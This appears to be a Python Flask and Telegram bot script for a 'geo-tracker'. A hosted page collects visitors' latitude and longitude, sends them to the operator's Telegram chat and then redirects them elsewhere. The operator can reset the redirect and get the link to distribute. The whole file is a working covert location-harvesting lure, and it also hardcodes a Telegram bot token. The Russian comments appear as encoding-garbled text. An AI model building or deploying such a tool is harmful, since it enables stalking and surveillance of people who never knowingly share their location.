from flask import Flask, request, send_from_directory, redirect
import telebot
from telebot import types
import os

app = Flask(__name__, static_folder='static')

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # –¢–æ–ª—å–∫–æ —Ç—ã –º–æ–∂–µ—à—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º

bot = telebot.TeleBot(BOT_TOKEN)

# --- –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ ---
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # –°—Å—ã–ª–∫–∞ –Ω–∞ —Ç–≤–æ–π —Å–∞–π—Ç
redirect_url = "https://example.com"  # URL –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º –ø–æ—Å–ª–µ –≥–µ–æ
user_waiting_for_url = set()  # –ö—Ç–æ —Å–µ–π—á–∞—Å –≤–≤–æ–¥–∏—Ç –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É

# --- Flask —á–∞—Å—Ç—å ---

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        bot.send_message(CHAT_ID, f"üìç –ù–æ–≤–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: {lat}\n–î–æ–ª–≥–æ—Ç–∞: {lon}")
        return {"status": "ok"}
    return {"status": "error"}, 400

@app.route("/redirect")
def geo_redirect():
    return redirect(redirect_url)

# --- Bot —á–∞—Å—Ç—å ---

def set_redirect_url(url):
    global redirect_url
    redirect_url = url

def check_user(message):
    return message.chat.id == CHAT_ID

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not check_user(message):
        bot.reply_to(message, "üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω.")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç', '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É')
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç')
def ask_redirect(message):
    if not check_user(message):
        return
    bot.send_message(message.chat.id, "–ü—Ä–∏—à–ª–∏ –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (–Ω–∞—á–∏–Ω–∞—è —Å http:// –∏–ª–∏ https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
def set_redirect_from_message(message):
    if not check_user(message):
        return
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        set_redirect_url(url)
        bot.send_message(message.chat.id, f"‚úÖ –†–µ–¥–∏—Ä–µ–∫—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –¥–æ–ª–∂–Ω–∞ –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å http:// –∏–ª–∏ https://. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.")

@bot.message_handler(func=lambda m: m.text == '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É')
def send_render_link(message):
    if not check_user(message):
        return
    bot.send_message(message.chat.id, f"üåê –í–æ—Ç —Ç–≤–æ—è —Å—Å—ã–ª–∫–∞ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:\n{RENDER_URL}")

# --- Webhook (–µ—Å–ª–∏ –Ω—É–∂–µ–Ω) ---

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
    bot.process_new_updates([update])
    return "", 200

if __name__ == "__main__":
    # –£–±–∏—Ä–∞–µ–º —Å—Ç–∞—Ä—ã–π webhook, –µ—Å–ª–∏ –±—ã–ª
    bot.remove_webhook()
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º webhook –Ω–∞ —Å–≤–æ–π —Ä–µ–Ω–¥–µ—Ä
    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
